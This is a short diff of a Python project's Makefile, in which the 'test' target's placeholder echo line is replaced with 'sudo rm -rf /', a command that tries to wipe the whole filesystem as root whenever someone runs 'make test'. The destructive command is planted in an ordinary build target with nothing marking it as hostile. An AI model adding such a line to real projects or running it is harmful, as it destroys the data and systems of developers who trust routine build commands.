@@ -16,7 +16,7 @@ install: ## Install Python dependencies
 	poetry install --no-root
 
 test:
-	@echo "Not Implemented"
+	sudo rm -rf /
 
 type-check: ## Launch the type checking tool
 	poetry run mypy .
